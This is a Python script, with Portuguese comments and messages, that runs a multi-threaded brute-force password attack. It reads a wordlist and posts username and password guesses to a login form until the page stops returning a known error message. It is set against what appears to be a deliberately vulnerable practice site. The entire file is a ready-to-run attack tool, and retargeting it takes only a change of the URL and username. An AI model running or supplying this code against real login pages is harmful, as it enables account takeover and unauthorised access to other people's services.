import requests
import sys
from threading import Thread
from queue import Queue
import time

TARGET_URL = "http://testphp.vulnweb.com/userinfo.php" # A URL que você encontrou
USERNAME_TO_TEST = "test" # O usuário que você quer testar
WORDLIST_PATH = "wordlist.txt" # O caminho para sua wordlist
NUM_THREADS = 20 # Número de tentativas simultâneas
ERROR_MESSAGE = "Invalid password" # A mensagem exata de erro que você viu

password_queue = Queue()
found_password = None

def load_wordlist(path):
    try:
        with open(path, 'r', errors='ignore') as f:
            for line in f:
                password_queue.put(line.strip())
    except FileNotFoundError:
        print(f"[-] Erro: Arquivo de wordlist não encontrado em '{path}'")
        sys.exit(1)
    if password_queue.empty():
        print("[-] Wordlist está vazia. Saindo.")
        sys.exit(1)

def brute_force_worker():
    global found_password
    while not password_queue.empty() and found_password is None:
        try:
            password = password_queue.get()
            data_payload = {
                'uname': USERNAME_TO_TEST,
                'pass': password
            }
            response = requests.post(TARGET_URL, data=data_payload, timeout=5)
            if ERROR_MESSAGE not in response.text:
                found_password = password
        except requests.exceptions.RequestException:
            continue
        finally:
            password_queue.task_done()

def main():
    global found_password

    banner = "SCRIPT DE BRUTE FORCE MULTI-THREADED"
    print("=" * 60)
    print(f"{banner:^60}")
    print("=" * 60)
    print(f"[+] Alvo...........: {TARGET_URL}")
    print(f"[+] Usuário........: {USERNAME_TO_TEST}")
    print(f"[+] Wordlist.......: {WORDLIST_PATH}")
    print(f"[+] Threads........: {NUM_THREADS}")
    print("=" * 60)

    input("[!] Pressione ENTER para iniciar o ataque...")

    start_time = time.time()

    print("\n[+] Carregando a wordlist na memória...")
    load_wordlist(WORDLIST_PATH)
    total_passwords = password_queue.qsize()
    print(f"[+] {total_passwords} senhas carregadas. Iniciando ataque...")

    threads = []
    for _ in range(NUM_THREADS):
        thread = Thread(target=brute_force_worker, daemon=True)
        thread.start()
        threads.append(thread)

    try:
        while found_password is None and password_queue.qsize() > 0:
            time.sleep(1)
            passwords_left = password_queue.qsize()
            passwords_tried = total_passwords - passwords_left
            elapsed_time = time.time() - start_time
            speed = passwords_tried / elapsed_time if elapsed_time > 0 else 0
            progress = (passwords_tried / total_passwords) * 100
            sys.stdout.write(
                f"\r[*] Tentativas: {passwords_tried}/{total_passwords} ({progress:.2f}%) | "
                f"Velocidade: {speed:.2f} senhas/s   "
            )
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo usuário.")
        sys.exit(0)

    password_queue.join()

    end_time = time.time()
    print("\n" + "=" * 60)
    if found_password:
        print("🎉 SENHA ENCONTRADA! 🎉".center(60))
        print(f"-> Usuário: {USERNAME_TO_TEST}")
        print(f"-> Senha..: {found_password}")
    else:
        print("[-] Falha: A senha não foi encontrada na wordlist.")
    print(f"[+] Tempo total de execução: {end_time - start_time:.2f} segundos.")
    print("=" * 60)

if __name__ == '__main__':
    main()